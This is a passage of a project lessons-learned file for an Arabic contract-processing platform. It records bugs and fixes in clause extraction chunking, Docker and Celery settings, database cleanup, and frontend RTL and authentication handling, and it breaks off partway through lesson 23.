# lessons.md — SIGN + MANAGEX Platform
> This file documents every bug, issue, and fix that took significant time to resolve.
> Feed this file to Claude at the start of every session to avoid repeating mistakes.
> Last updated: 2026-05-21 (Lessons #81–82 — Frontend npm ci must run from repo root; docker restart does not reload .env.)

---

## How to Use This File
- Read this file at the start of every Claude session
- Add new lessons after every bug that took more than 30 minutes to fix
- Format: Problem → Root Cause → Fix → How to Avoid

---

## 📋 Table of Contents
1. Clause Extraction — max_tokens too small
2. Clause Extraction — Wrong Arabic clause patterns
3. Clause Extraction — Sub-articles split as separate clauses
4. Clause Extraction — Cover page trimming too aggressive
5. Clause Extraction — Large documents timing out (chunking solution)
6. Clause Extraction — Tiny orphan chunks crashing extraction
7. Clause Extraction — Oversized single articles still too large after chunking
8. Clause Extraction — Chunk boundaries splitting articles in half
9. Clause Extraction — TOC entries extracted as real clauses
10. Clause Extraction — Cross-references mistaken as clause headings
11. Clause Extraction — Duplicate clauses from overlapping chunks
12. Clause Extraction — API costs too high (tiered max_tokens fix)
13. Clause Extraction — Definitions clause not formatted as bullet points
14. Docker — bcrypt binary fails on Windows
15. Docker — CRLF line endings crash entrypoint on Linux
16. Docker — Celery worker code changes not taking effect
17. Docker — Concurrency set to 1 (all documents process sequentially)
18. Docker — Celery tasks killed at 600s (large documents always fail)
19. Word File Extraction — Tables and headers missing
20. Database — Orphaned clauses inflating dashboard count
21. Frontend — currentUser always null after page refresh
22. Frontend — Arabic text displaying left-to-right
23. Frontend — Comment edit/delete icons not showing
24. Frontend — Portal chooser redirect loop for admin users
25. GitHub — Personal access token expiring
26. GitHub — Mac osxkeychain interfering with token
27. Clause Extraction — مادة (N) prefix appearing in clause content
28. Docker — Backend not rebuilt after colleague adds npm packages
29. Security — Secrets Audit Before AWS Deployment
30. Frontend — Hardcoded localhost:5175 CENVOX Backlinks in SIGN Layouts
31. Backend — Silent Catch Blocks Masking Critical Failures
32. Backend — Paymob Webhook Activation Needs Idempotency Before Fix
33. Docker — New npm Package Not Found After Rebuild
34. Backend — New Required Joi Var Breaks Teammates' Environments
35. Testing — AuthService Has 14 Constructor Dependencies
36. Testing — Vite Config Must Stay Untouched, Use Separate vitest.config.ts
37. Testing — Mock at Service Level Never at Axios Level
38. Testing — pytest.ini Must Set pythonpath = . or All Imports Fail
39. Testing — Celery bind=True Tasks Need .run(payload) Not task(None, payload)
40. DTOs — Fields Without Class-Validator Decorators Are Silently Stripped
41. Defense-in-Depth — Frontend Filters Are Never Enough
42. @MaxLength — Apply to BOTH Create AND Update DTOs
43. sanitize-html — Correct Import Syntax When esModuleInterop Is Off
44. Rebrand — Parent Brand Switched from CENVOX to MANAGEX
45. Preview — Vite Cannot Bind 5175 While Docker Is Running
46. Ports — 5175 Is the Canonical MANAGEX Landing Port
47. Coordination — "Done" = On Main With Green CI, Never "Pushed to a Branch"
48. Rebrand — Always Run a Negative-Filter Sweep After a Big Rename
49. Coordination — Rebasing Requires Pulling BEFORE Opening a PR
50. gitignored Files Are Invisible to Rebrand Sweeps
51. gh CLI — workflow Scope Required to Push CI Workflow Files
52. Coordination — Open a DRAFT PR Within 24–48 Hours of Branch Creation
53. Post-Merge — Always Verify Phase 3.2 Artifacts Survived
54. SQL Injection — TypeORM Parameterization Is Already There by Default
55. LIKE Wildcard Leakage vs SQL Injection — Different Problems
56. New ILIKE Sites Need escapeLikeParam() When Branches Merge
57. Mass Assignment via Partial<Entity> — Never Use Entities as DTOs
58. Plain TypeScript Interfaces Get Zero Validation from class-validator
59. Every Inline @Body() Object Is a Validation Gap
60. multer memoryStorage Has No Size Limit by Default
61. Path Traversal in File Serving — Always Contain Paths
62. Optional Chaining on Methods That Return Objects
63. IP Extraction Must Use a Single Shared Utility
64. app.set('trust proxy', ...) Must Be Set Before Any IP-Based Middleware
65. Auth Error Messages Must Never Distinguish Between Failure Reasons
66. Rate-Limit Storage Must Be Redis-Backed in Production
67. Named Throttlers Are Not Per-Method — You Must Skip the Others
68. Email Template Injection — User Strings Must Be HTML-Escaped at Output
69. CSP connectSrc Must Include Your Production API Origin
70. Two Types of HTML Escaping — Input Sanitization vs Output Escaping
71. Token Family Tracking Is the Correct Reuse-Attack Response
72. Access Token Blacklisting Requires jti Claims
73. Every Login Path Must Call _finalizeLogin
74. SessionTrackingMiddleware Must Key on jti, Not Token Hash
75. Dual Storage Is Technical Debt That Must Be Retired Promptly
76. DB Family Revocation Does Not Invalidate Live Access Tokens
77. Stale Service Mocks Break CI When New Methods Are Added
78. Multiple DTOs With the Same Name — Always Trace the Actual Endpoint
79. Never Test Destructive Endpoints With Real User Credentials on a Live Database
80. Password Validation Audit Must Cover ALL DTOs With a Password Field
81. Testing — Frontend npm ci Must Run From Repo Root, Not apps/sign/
82. Docker — docker restart Does Not Reload .env — Use docker-compose up -d

---

## 1. Clause Extraction — max_tokens Too Small

**Problem:**
- Clause extraction was returning 0 clauses
- No error shown in UI
- JSON responses were being cut off mid-string

**Root Cause:**
- `max_tokens` was hardcoded to `8192` in `clause_extractor.py`
- Arabic contracts with 20+ clauses require 15,000–25,000 output tokens
- Claude was generating correct JSON but hitting the token limit mid-response
- `json.loads()` then threw `JSONDecodeError` on the truncated response

**Fix:**
- Implemented tiered `_calculate_max_tokens()` method:
  - Chunks < 10,000 chars → 16,000 tokens
  - Chunks < 20,000 chars → 24,000 tokens
  - Chunks >= 20,000 chars → 32,000 tokens
- This saves 50-75% vs old hardcoded 64,000

**File:** `ai-backend/app/agents/clause_extractor.py`

**How to Avoid:**
- Never hardcode `max_tokens` for Arabic content
- Arabic JSON output is larger than estimated — always add 50% buffer
- Always check celery logs for JSONDecodeError when clauses = 0

---

## 2. Clause Extraction — Wrong Arabic Clause Patterns

**Problem:**
- Particular Conditions clauses not being recognized
- Extraction returning 0 clauses even with correct text
- The document used `مادة (1)` format but prompt only handled `المادة (1)`

**Root Cause:**
- SYSTEM_PROMPT only listed: `"المادة 1"`, `"المادة (1)"`, `"مادة رقم"`
- Missing the most common Egyptian government contract format: `مادة (1)` (without ال article)
- Also missing: `مادة (١)` Arabic-Indic numerals, `مادة رقم (١)`, `مادة 1` without brackets

**Fix:**
- Added all مادة variations to Guideline 8 in SYSTEM_PROMPT:
  - `مادة (1)` / `مادة (١)` — Western or Arabic-Indic in brackets
  - `مادة رقم (1)` / `مادة رقم (١)` — with رقم
  - `مادة 1` / `مادة ١` — no brackets
  - `المادة 1` / `المادة (1)` / `المادة رقم` — with definite article
- Also added البند رقم (N) format for Contract Agreement documents

**File:** `ai-backend/app/agents/clause_extractor.py`

**How to Avoid:**
- Egyptian government contracts use `البند رقم (N):` format
- Particular Conditions use `مادة (N)` format
- General Conditions use `مادة (N) : title :` format
- Always check actual document text before assuming clause marker format
- Run: `SELECT LEFT(extracted_text, 500) FROM document_uploads WHERE ...`

---

## 3. Clause Extraction — Sub-articles Split as Separate Clauses

**Problem:**
- Particular Conditions: 16 clauses extracted but structure was wrong
- Sub-articles like `9-1`, `9-2`, `9-3` were extracted as separate top-level clauses
- مادة 12 with sub-articles 12-1 through 12-10 created 10 separate clauses instead of 1

**Root Cause:**
- SYSTEM_PROMPT Guideline 3 said "each clause should be atomic" with no exception for sub-articles
- Claude treated `9-2`, `9-3` as "separate" and made them atomic
- No rule existed to explain that N-M and N/M patterns are sub-articles not top-level clauses

**Fix:**
- Updated Guideline 3: Added explicit sub-article exception
- Added Guideline 10: "Everything from مادة (N) to مادة (N+1) = ONE clause"
- Sub-articles numbered N-M (dash) or N/M (slash) must stay inside parent مادة
- `clause_number` should always be the parent number, never the sub-article number

**File:** `ai-backend/app/agents/clause_extractor.py`

**How to Avoid:**
- Always verify sub-article containment after first extraction
- Check DB: `SELECT clause_number, title FROM clauses WHERE source_document_id = '...'`
- If you see clause_number like "9-2" or "4/1" — sub-article rule is broken

---

## 4. Clause Extraction — Cover Page Trimming Too Aggressive

**Problem:**
- Particular Conditions extraction was missing Articles 1-8 completely
- First extracted clause had no section number and started mid-article
- General Conditions started from wrong position in document

**Root Cause:**
- `trimCoverPages()` in `document-processing.service.ts` matched `تم الاتفاق` pattern
- This phrase appeared inside a sub-article body (not just on the cover page)
- The function cut everything before that match — deleting Articles 1-8

**Fix:**
- For Conditions documents (Particular/General): now searches for FIRST `مادة` marker
- Pattern: `/مادة\s*[\(\s]?[١-٩\d]/`
- For Agreement documents: kept existing behavior (searches for `تم الاتفاق` first)
- Document type detected by label: conditions/شروط/general/particular/spec/مواصفات

**File:** `backend/src/modules/document-processing/document-processing.service.ts`

**How to Avoid:**
- After reprocessing always verify: `SELECT LEFT(extracted_text, 200) FROM document_uploads WHERE ...`
- Text should start at the first real clause marker not mid-sentence
- Never use broad Arabic phrases as cover page markers — they appear in body text too

---

## 5. Clause Extraction — Large Documents Timing Out (Chunking Solution)

**Problem:**
- General Conditions (81,315 chars) always timed out
- Task was killed at exactly 600 seconds every time
- Retry loop: killed → NestJS retried → killed again → infinite loop
- Single API call for 70k+ chars is too large for Claude to process reliably

**Root Cause:**
- Sending the entire document in one Claude API call
- Claude needs 8-10 minutes just for the API call on 70k+ char documents
- No chunking strategy existed — all or nothing approach

**Fix — Chunking Implementation:**
- Documents > 30,000 chars → automatically use `_extract_chunked()` method
- Documents <= 30,000 chars → use `_extract_single()` (existing behavior unchanged)
- Chunk size: `_CHUNK_SIZE = 15,000` chars maximum
- Split at `مادة` article boundaries using `_ARTICLE_BOUNDARY_RE` regex
- Each chunk processed by separate Claude API call sequentially
- Results merged and deduplicated after all chunks complete

**Key Methods Added to clause_extractor.py:**
- `_extract_single()` — existing logic moved here for small documents
- `_extract_chunked()` — orchestrates chunking for large documents
- `_split_on_article_boundaries()` — splits text at مادة markers respecting chunk size
- `_merge_small_chunks()` — merges tiny leftover fragments (< 500 chars) into previous chunk
- `_break_oversized_chunk()` — handles single articles that still exceed chunk size
- `_add_article_context()` — prepends مادة heading when chunk starts mid-article
- `_group_by_boundaries()` — groups text into ≤ max_size pieces with overlap
- `_calculate_max_tokens()` — dynamic token limit based on chunk size
- `_call_api_with_retry()` — handles 529/connection errors with exponential backoff
- `_parse_json()` — graceful JSON parsing with empty response handling

**Fix — Docker Settings in docker-compose.yml:**
- `--concurrency=1` → `--concurrency=3` (3 docs in parallel)
- `--time-limit=2400` (40 minutes hard limit)
- `--soft-time-limit=1800` (30 minutes soft limit)
- Memory: 2G → 3G to support 3 parallel workers
- Added source code volume mount: `./ai-backend:/app`

**Files:**
- `ai-backend/app/agents/clause_extractor.py`
- `docker-compose.yml`

**How to Avoid:**
- Any document over 30,000 chars MUST use chunking automatically
- Never send full large Arabic document in one API call
- Check document size: `SELECT length(extracted_text) FROM document_uploads WHERE ...`
- Expected chunk count: document_chars / 15,000 = approximate number of chunks
- General Conditions (81k chars) → ~9-12 chunks → ~20 minutes total

---

## 6. Clause Extraction — Tiny Orphan Chunks Crashing Extraction

**Problem:**
- After implementing chunking, extraction kept failing on chunk 3
- Error: `Expecting value: line 1 column 1 (char 0)` — empty JSON response
- A 202-character chunk was being sent to Claude
- Claude returned prose instead of JSON for tiny fragments
- Entire task failed when one chunk failed

**Root Cause:**
- `_split_on_article_boundaries()` was creating tiny leftover fragments
- When splitting large articles, small text pieces (202 chars) were left as separate chunks
- Claude cannot extract clauses from 202 chars and returned empty/prose response
- Empty response caused `json.loads()` to crash the entire task

**Fix:**
- Added `_merge_small_chunks()` method:
  - Any chunk < 500 chars gets merged into the PREVIOUS chunk
  - Prevents orphan fragments from reaching Claude API
- Min chunk skip threshold raised: 100 → 500 chars as extra safety net
- Graceful error handling in chunk processing loop:
  - If one chunk fails → log warning and continue with next chunk
  - Never crash entire task due to one bad chunk

**File:** `ai-backend/app/agents/clause_extractor.py`

**How to Avoid:**
- Always run `_merge_small_chunks()` after splitting before processing
- Log chunk sizes when extraction starts — check for any chunk < 500 chars
- If you see "Expecting value: line 1 column 1" — a tiny chunk is the cause
- Check logs for: "Merging tiny chunk (N chars) into previous chunk"

---

## 7. Clause Extraction — Oversized Single Articles Still Too Large After Chunking

**Problem:**
- Even after implementing 15,000 char chunks, Article 1 (Definitions) in General Conditions was 44,378 chars
- This single article exceeded the chunk size — sent as one 44k chunk
- Claude took 9+ minutes to process it — nearly hitting timeout again
- The basic chunking only split at مادة boundaries, so a huge single article stayed huge

**Root Cause:**
- `_split_on_article_boundaries()` split ONLY at مادة markers
- Article 1 (Definitions) has no sub-مادة markers — it's one massive definitions article
- Result: chunk 1 = 44,378 chars (too big), causing slow API response
- The chunk size limit was not enforced when a single article exceeded it

**Fix:**
- Added `_break_oversized_chunk()` method with 3-level fallback:
  1. **Level 1:** Split at sub-article boundaries (`_SUB_ARTICLE_RE`: N-M or N/M patterns)
  2. **Level 2:** Split at paragraph boundaries (`\n\n`)
  3. **Level 3:** Hard cut every 15,000 chars with 200-char overlap (last resort)
- Added `_group_by_boundaries()` helper: groups text into ≤ max_size pieces at given split points
- Added `_SUB_ARTICLE_RE` regex: `r"(?m)^[١-٩\d]{1,3}\s*[-/]\s*[١-٩\d]{1,3}"`
- Result: 44,378-char Article 1 now splits into ~3 sub-chunks of ~15k chars each
- Processing time improved: 9.5 minutes → ~3 minutes per sub-chunk

**File:** `ai-backend/app/agents/clause_extractor.py`

**How to Avoid:**
- After splitting, check if any chunk exceeds `_CHUNK_SIZE` (15,000 chars)
- Arabic Definitions articles (مادة 1 in General Conditions) are almost always oversized
- Look for log message: "Oversized chunk (N chars) → M pieces at paragraph boundaries"
- Expected result for General Conditions: 81k chars → 9-12 chunks of 8-15k each

---

## 8. Clause Extraction — Chunk Boundaries Splitting Articles in Half

**Problem:**
- General Conditions extracted 56 clauses instead of correct 38
- Sub-articles of مادة 12 were extracted as separate top-level clauses
- Some clause content started mid-sentence
- Chunk 2 started mid-article and Claude extracted the continuation as new clauses

**Root Cause:**
- Chunking split at 15,000 char boundaries
- Sometimes a chunk ended in the MIDDLE of a large article (like مادة 12)
- The next chunk started mid-article with no مادة header context
- Claude saw the continuation text and extracted it as new standalone clauses

**Fix:**
- Added `_add_article_context()` method:
  - Checks if chunk starts with a مادة marker using `_ARTICLE_BOUNDARY_RE`
  - If NOT → finds the last مادة heading from the previous chunk
  - Prepends that heading to give Claude the article context
- Added explicit instruction to Claude prompt for each chunk:
  ```
  "CHUNK {i+1} OF {total}:
  Only extract clauses that START in this chunk.
  A clause STARTS when you see a مادة marker at the beginning of a line.
  Do NOT extract content that is a continuation of a clause that started before this chunk."
  ```
- Result: Chunk 2 starting mid-article → Claude correctly returns 0 clauses (recognized as continuation)
- General Conditions went from 56 wrong clauses → 38 correct clauses

**File:** `ai-backend/app/agents/clause_extractor.py`

**How to Avoid:**
- After chunked extraction always verify total clause count matches expected document count
- If clause count is HIGHER than expected → chunk boundary issue
- Check: `SELECT clause_number, title FROM clauses WHERE source_document_id = '...' ORDER BY clause_number`
- Look for clause_numbers like "9-2" or clauses with very short content (< 50 chars)
- Check logs for: "Chunk X starts mid-article — prepending heading: مادة (N)..."

---

## 9. Clause Extraction — TOC Entries Extracted as Real Clauses

**Problem:**
- General Conditions document has a Table of Contents appended at the end of extracted text
- TOC contains entries like: `مادة (1) : تعريفات وتفسيرات ......... 4`
- Claude was extracting these TOC entries as real clauses (creating duplicates)

**Root Cause:**
- TOC entries look identical to real article headings syntactically
- Original Guideline 7 said "skip table of contents" but wasn't specific enough
- Claude couldn't reliably distinguish TOC from real articles
- Word file extractor appends table content (including TOC tables) at the END of extracted text

**Fix:**
- Strengthened Guideline 7 with specific TOC identification rules:
  - TOC identified by: مادة (N) followed by dotted lines (`......`)
  - Standalone page numbers on their own lines between entries
  - Multiple مادة entries listed sequentially with NO body text between them
  - ALL such entries must be completely skipped — never extracted as clauses

**File:** `ai-backend/app/agents/clause_extractor.py`

**How to Avoid:**
- Word files often append the TOC table at the END of extracted text
- Always verify extracted text end: `SELECT RIGHT(extracted_text, 500) FROM document_uploads WHERE ...`
- If you see dotted lines and page numbers → TOC is appended and needs Guideline 7
- TOC pattern: `مادة (N) : title ......... page_number`

---

## 10. Clause Extraction — Cross-References Mistaken as Clause Headings

**Problem:**
- General Conditions body text contains phrases like:
  `طبقا للمادة (22) من هذه الشروط العامة`
- These look identical to real clause headings syntactically
- Claude was creating phantom clauses from inline cross-references

**Root Cause:**
- `مادة (N)` appears both as real headings AND as cross-references in body text
- No rule existed to distinguish between them
- Real heading: `مادة (12) :` at start of line followed by title
- Cross-reference: `مادة (22)` mid-sentence after من/طبقا/بموجب

**Fix:**
- Added Guideline 11: Real article headings vs cross-references
- Real heading characteristics: مادة (N) at START of line + colon + title + body text follows
- Cross-reference characteristics: مادة (N) mid-sentence preceded by:
  - من / طبقا للمادة / بموجب مادة / أحكام مادة / وفقاً للمادة / تطبيق مادة
- Cross-references are NEVER clause boundaries — always ignore them

**File:** `ai-backend/app/agents/clause_extractor.py`

**How to Avoid:**
- Any Arabic contract document with frequent article cross-references needs Guideline 11
- FIDIC-based Arabic contracts are especially prone to this issue
- Check for phantom clauses: clauses with no body text or very short content (< 50 chars)
- Phantom clauses from cross-references usually have no title or generic titles

---

## 11. Clause Extraction — Duplicate Clauses from Overlapping Chunks

**Problem:**
- After chunked extraction, duplicate clauses appeared in the database
- Same clause extracted by two adjacent chunks
- Total clause count was inflated

**Root Cause:**
- When a chunk boundary fell near a مادة heading
- Both the previous chunk (end) and next chunk (start) extracted the same clause
- No deduplication was happening after merging all chunk results

**Fix:**
- Added deduplication by normalized title after merging all chunks:
  - `seen_titles` set tracks extracted clause titles
  - First occurrence kept, subsequent duplicates silently dropped with debug log
- Also added deduplication by clause_number as secondary check

**File:** `ai-backend/app/agents/clause_extractor.py`

**How to Avoid:**
- Always run deduplication after merging chunk results
- Check for duplicates:
  ```sql
  SELECT clause_number, COUNT(*) FROM clauses
  WHERE source_document_id = '...'
  GROUP BY clause_number HAVING COUNT(*) > 1
  ```
- If duplicates found in DB (cleanup query):
  ```sql
  DELETE FROM clauses WHERE id NOT IN (
    SELECT MIN(id) FROM clauses
    WHERE source_document_id = '...'
    GROUP BY clause_number
  )
  ```

---

## 12. Clause Extraction — API Costs Too High

**Problem:**
- Anthropic API costs were much higher than expected
- `max_tokens=64000` was hardcoded — paying for 64k tokens even when only 5k used
- With 9 chunks per document × 64,000 max_tokens = massive unnecessary cost

**Root Cause:**
- Original fix for truncation (Lesson 1) set max_tokens to 64,000 globally
- Arabic contracts with 15k char chunks only need ~16,000-24,000 output tokens
- Paying for 64,000 but using maybe 10,000 = 6x more expensive than needed

**Fix:**
- Replaced hardcoded 64,000 with tiered `_calculate_max_tokens()` method:
  - Chunk < 10,000 chars → max_tokens = 16,000 (saves 75% vs 64k)
  - Chunk < 20,000 chars → max_tokens = 24,000 (saves 62% vs 64k)
  - Chunk >= 20,000 chars → max_tokens = 32,000 (saves 50% vs 64k)
- Dynamic value calculated and logged at DEBUG level for each API call
- Note: Do NOT go below these values — earlier attempt with dynamic formula failed
  because Arabic JSON output is denser than estimated (see Lesson 1)

**File:** `ai-backend/app/agents/clause_extractor.py`

**How to Avoid:**
- Never hardcode max_tokens to maximum value for Arabic content
- Use the tiered approach — tested and confirmed safe
- Monitor Anthropic API usage at console.anthropic.com after each extraction
- Do not use dynamic formula (input_chars / 4 * 1.5) — underestimates Arabic output density

---

## 13. Clause Extraction — Definitions Clause Not Formatted as Bullet Points

**Problem:**
- مادة (1) in General Conditions contains 25+ definitions
- All definitions were stored and displayed as one long unreadable paragraph
- Terms and explanations were merged together with no visual separation

**Root Cause:**
- No instruction in SYSTEM_PROMPT for how to format definitions clauses
- Claude merged all definitions into continuous prose
- Frontend rendered clause content as a single `<p>` tag with no structure

**Fix — Part 1: Extraction (Guideline 12 added to SYSTEM_PROMPT):**
- Instructs Claude to format definitions as bullet points:
  ```
  - الهيئة أو العميل: يقصد بها الهيئة القومية للأنفاق
  - ممثل الهيئة: يقصد به الإستشارى العام للمشروع
  ```
- Each definition merged onto ONE line: `- term: explanation`
- Heading and intro sentence go on their own lines before the bullets
- Only applies to definitions clauses (تعريفات) not regular articles

**Fix — Part 2: Display (ClauseReviewCard.tsx):**
- Added `ClauseContentDisplay` component that:
  - Detects lines starting with `- ` automatically
  - Renders as RTL `<ul>` list:
    - `dir="rtl"` so bullets appear on RIGHT side (correct for Arabic)
    - `paddingRight: 1.5rem`, `paddingLeft: 0`
    - `textAlign: right`
  - Non-bullet lines render as regular `<p dir="auto">` paragraphs inline
  - Show more/Show less functionality preserved (shows max 4 bullets collapsed)

**Files:**
- `ai-backend/app/agents/clause_extractor.py` (Guideline 12)
- `apps/sign/src/components/review/ClauseReviewCard.tsx` (ClauseContentDisplay component)

**How to Avoid:**
- Arabic definitions clauses always need bullet point formatting
- Verify in DB after extraction:
  `SELECT LEFT(content, 300) FROM clauses WHERE title ILIKE '%تعريف%'`
- Should see lines starting with `- ` prefix
- In UI: bullets must appear on RIGHT side not left (use `dir="rtl"` on `<ul>`)

---

## 14. Docker — bcrypt Binary Fails on Windows

**Problem:**
- Backend container crashed on startup after `docker-compose up`
- Error: `Error loading shared library` or `invalid ELF header` for bcrypt
- Only happened on Windows machines

**Root Cause:**
- bcrypt is a native Node.js module compiled for the host OS
- When `node_modules` is volume-mounted from Windows into Linux container
- The Windows-compiled bcrypt binary is incompatible with Linux

**Fix:**
- Added `docker-entrypoint.sh` that runs `npm rebuild bcrypt` at container startup
- This recompiles bcrypt for the Linux container environment
- Added to `backend/Dockerfile`: `sed -i 's/\r//'` to strip CRLF from entrypoint

**Files:**
- `backend/docker-entrypoint.sh`
- `backend/Dockerfile`

**How to Avoid:**
- Any native Node.js module (bcrypt, sharp, canvas) will have this issue on Windows
- Always run `npm rebuild <module>` in the container, not on the host
- Add to entrypoint script, not Dockerfile build step (runs every container start)

---

## 15. Docker — CRLF Line Endings Crash Entrypoint on Linux

**Problem:**
- Backend container crashed with: `/usr/bin/env: 'bash\r': No such file or directory`
- Only happened after pulling from Windows-developed code

**Root Cause:**
- Windows uses CRLF (`\r\n`) line endings
- Linux expects LF (`\n`) only
- Git on Windows sometimes commits CRLF even with autocrlf settings
- The `\r` in bash scripts causes Linux to look for `bash\r` instead of `bash`

**Fix:**
- Added to `backend/Dockerfile` build step:
  `sed -i 's/\r//' /app/docker-entrypoint.sh`
- This strips all carriage returns at Docker build time
- Permanent fix — works regardless of how the file was committed

**File:** `backend/Dockerfile`

**How to Avoid:**
- Always add `sed -i 's/\r//'` in Dockerfile for any shell scripts
- Configure Git globally: `git config --global core.autocrlf input`
- Check for CRLF: `cat -A docker-entrypoint.sh | grep '\^M'`

---

## 16. Docker — Celery Worker Code Changes Not Taking Effect

**Problem:**
- Modified `tasks.py` or `clause_extractor.py` but celery worker kept using old code
- Restarting the container didn't help
- Changes were invisible to the running worker

**Root Cause:**
- The celery-worker container in `docker-compose.yml` only had:
  `volumes: - uploads_data:/app/uploads`
- It did NOT have the source code mounted: `./ai-backend:/app`
- The worker was using code baked into the Docker image at build time
- Only `docker-compose up --build` would pick up changes — very slow

**Fix:**
- Added source code volume mount to celery-worker in `docker-compose.yml`:
  `- ./ai-backend:/app`
- Now changes to any Python file are immediately visible to the worker
- Only need `docker restart sign-celery-worker` not a full rebuild

**File:** `docker-compose.yml`

**How to Avoid:**
- Always check if the container has a source code volume mount
- Without `./ai-backend:/app` mount → must rebuild image for every code change
- With mount → just restart the container: `docker restart sign-celery-worker`

---

## 17. Docker — Concurrency Set to 1 (Sequential Processing)

**Problem:**
- Uploading 3 documents → total processing time 20+ minutes
- Second document couldn't start until first finished
- Third document couldn't start until second finished
- Users saw 0% → 33% → 66% → 100% progress very slowly

**Root Cause:**
- `docker-compose.yml` had: `command: celery -A app.tasks worker --concurrency=1`
- Only ONE document could be processed at a time
- With 3 documents at ~4 min each: total = 12+ minutes sequential wait

**Fix:**
- Changed to `--concurrency=3`
- All 3 documents now process in parallel
- Total time: max(doc1_time, doc2_time, doc3_time) instead of sum
- Also raised memory limit from 2G to 3G to support 3 parallel workers (~512MB each)

**File:** `docker-compose.yml`

**How to Avoid:**
- Always set concurrency to number of expected parallel documents
- Monitor with: `docker exec sign-celery-worker celery inspect stats 2>/dev/null`
- Check `"max-concurrency"` and `"processes"` in output
- Memory formula: concurrency × 512MB + 512MB overhead = minimum container memory

---

## 18. Docker — Celery Tasks Killed at 600s

**Problem:**
- Large documents (General Conditions — 81k chars) always failed
- Task killed at exactly 600 seconds every time
- NestJS would auto-retry → killed again → infinite retry loop

**Root Cause:**
- Default Celery hard time limit was 600 seconds (10 minutes)
- Large Arabic documents need 15-20 minutes for full Claude API processing
- Worker process received SIGKILL at exactly 600s with no warning

**Fix:**
- Added to docker-compose celery command:
  `--time-limit=2400 --soft-time-limit=1800`
- Soft limit (30 min): graceful SoftTimeLimitExceeded exception — task can clean up
- Hard limit (40 min): absolute SIGKILL — never reached in practice with chunking

**File:** `docker-compose.yml`

**How to Avoid:**
- Always check document size before setting time limits
- General Conditions (81k chars) with chunking needs ~20 minutes total
- Formula: (num_chunks × avg_chunk_api_time) + merge_time = total time needed
- Set hard limit to 2x estimated total time as safety buffer

---

## 19. Word File Extraction — Tables and Headers Missing

**Problem:**
- Word files with contract terms in tables had those terms missing from extraction
- Extracted text had large gaps compared to actual document content
- Clause extraction missed payment schedules and liability clauses entirely

**Root Cause:**
- `_extract_docx()` in `text_extractor.py` only read `doc.paragraphs`
- Text inside table cells is NOT included in `doc.paragraphs`
- Headers and footers are also NOT in `doc.paragraphs`
- Arabic contracts frequently put payment terms and liability clauses in table cells

**Fix:**
- Added table cell extraction loop:
  ```python
  for table in doc.tables:
      for row in table.rows:
          for cell in row.cells:
              if cell.text.strip():
                  paragraphs.append(cell.text.strip())
  ```
- Added header paragraph extraction from `doc.sections`

**File:** `ai-backend/app/services/text_extractor.py`

**How to Avoid:**
- Always extract from paragraphs + tables + headers for Word files
- Verify extraction quality: `SELECT length(extracted_text) FROM document_uploads WHERE ...`
- A 3MB Word file should yield at least 50,000+ chars if tables are properly extracted

---

## 20. Database — Orphaned Clauses Inflating Dashboard Count

**Problem:**
- Dashboard showed 179 clauses but only 85 were in the active project
- Clause count was wrong and confusing for users

**Root Cause:**
- Multiple failed/killed extraction runs had saved SOME clauses to `clauses` table
- But the pipeline never completed so `contract_clauses` junction table entries were never created
- Dashboard query counted ALL rows in `clauses` table instead of only linked ones
- 94 "ghost clauses" had no `source_document_id` and no `contract_clauses` entry

**Fix:**
- Deleted orphaned clauses:
  ```sql
  DELETE FROM clauses WHERE id NOT IN (
    SELECT DISTINCT clause_id FROM contract_clauses
  );
  ```
- Fixed dashboard query to use `innerJoin` on `contract_clauses` table
- Now only counts clauses properly linked to contracts via junction table

**Files:**
- `backend/src/modules/dashboard-analytics/dashboard-analytics.service.ts`

**How to Avoid:**
- After any killed/failed extraction run → check for orphaned clauses
- Check: `SELECT COUNT(*) FROM clauses WHERE id NOT IN (SELECT clause_id FROM contract_clauses)`
- If count > 0 → run the DELETE query above before reprocessing
- If dashboard numbers look wrong → first check for orphaned clauses

---

## 21. Frontend — currentUser Always Null After Page Refresh

**Problem:**
- After page refresh, user appeared logged in (token in localStorage)
- But `currentUser` in Redux was always `null`
- All permission checks failed: comment edit/delete, role checks, admin detection

**Root Cause:**
- Redux auth slice restores `token` from localStorage on startup
- But `user` object (with id, role, name) is NOT restored from localStorage
- `refreshUserProfile()` was only called in `MfaSetupPage` — never on app startup
- So after refresh: `isAuthenticated = true` but `currentUser = null` permanently

**Fix:**
- Added `useEffect` in both `AppLayout.tsx` and `AdminLayout.tsx`:
  ```javascript
  useEffect(() => {
    if (isAuthenticated && !user) {
      refreshUserProfile();
    }
  }, []);
  ```
- This fetches user profile from API on mount whenever token exists but user is null

**Files:**
- `apps/sign/src/components/layout/AppLayout.tsx`
- `apps/sign/src/components/layout/AdminLayout.tsx`

**How to Avoid:**
- Any feature using `currentUser?.id` or `currentUser?.role` depends on this fix being present
- Always test permission features after PAGE REFRESH, not just after fresh login
- If permission checks fail → first check if `currentUser` is null in Redux DevTools

---

## 22. Frontend — Arabic Text Displaying Left-to-Right

**Problem:**
- Extracted Arabic clauses displayed with text aligned to LEFT
- Should be RIGHT aligned (RTL direction)
- Made Arabic content very hard to read

**Root Cause:**
- Clause title and content elements had no RTL direction specified
- Browser defaulted to LTR for all text regardless of content language
- `dir="auto"` was not applied to text containers

**Fix:**
- Added `dir="auto"` and `style={{ unicodeBidi: 'plaintext' }}` to:
  - Clause titles (`<h4>`) in ClauseReviewCard
  - Clause content (`<p>`) in ClauseReviewCard
  - Edit textarea and title input in ClauseReviewCard
  - All clause display elements in ContractDetailPage (list view + modal)
- `dir="auto"` makes browser detect direction from first strong directional character
- Arabic text → right aligned automatically
- English text → left aligned automatically
- Mixed content → each paragraph detects its own direction

**Files:**
- `apps/sign/src/components/review/ClauseReviewCard.tsx`
- `apps/sign/src/pages/app/ContractDetailPage.tsx`

**How to Avoid:**
- Always add `dir="auto"` to any element that may display Arabic text
- Never assume all text is LTR in a bilingual Arabic/English application
- Test with actual Arabic content after any UI change to clause or document display

---

## 23. Frontend — Comment Edit/Delete Icons Not Showing

**Problem:**
- Pencil ✏️ and trash 🗑️ icons were in the code but never visible on hover
- No error shown — icons simply didn't appear
- `opacity-0 group-hover:opacity-100` was applied but elements didn't exist in DOM

**Root Cause (Two Issues):**

**Issue 1 — currentUser was null (see Lesson 21):**
- `isAuthor = comment.user_id === currentUser?.id` → always false when currentUser is null
- `canEdit = isAuthor` → false → pencil icon not rendered at all
- `canDelete = isAuthor || isAdmin` → false → trash icon not rendered at all
- `opacity-0/opacity-100` only helps if elements exist in the DOM — they didn't

**Issue 2 — AdminLayout logout race condition:**
- `handleLogout` was not async/await
- `logout()` started (async API call in flight)
